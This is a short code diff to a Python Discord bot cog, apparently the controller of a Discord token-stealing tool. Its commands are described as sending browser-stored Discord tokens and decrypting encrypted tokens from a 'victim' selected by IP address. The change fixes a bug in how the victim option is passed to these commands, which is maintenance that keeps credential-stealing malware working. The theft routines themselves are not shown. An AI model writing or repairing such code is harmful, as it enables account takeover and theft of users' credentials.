@@ -13,7 +13,7 @@ class RawTokens(commands.Cog):
         
     @commands.slash_command(
         description="Sends raw Discord Tokens from browsers (fast)",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def raw_tokens(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
@@ -33,7 +33,7 @@ class RawTokens(commands.Cog):
 
     @commands.slash_command(
         description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def raw_discord(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
